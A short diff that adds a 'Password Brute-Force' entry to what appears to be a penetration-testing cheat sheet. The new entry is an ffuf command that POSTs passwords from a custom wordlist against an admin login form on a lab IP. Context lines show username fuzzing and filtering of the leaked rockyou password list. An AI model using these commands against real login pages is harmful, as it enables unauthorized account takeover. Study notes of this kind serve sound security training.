@@ -1122,6 +1122,12 @@ $ ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u ht
 $ grep '[[:upper:]]' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
 ```
 
+- Password Brute-Force
+
+```
+$ ffuf -w ./custom_wordlist.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
+```
+
 #19. - Sensitive Data Exposure
 -----------------------------------------
 
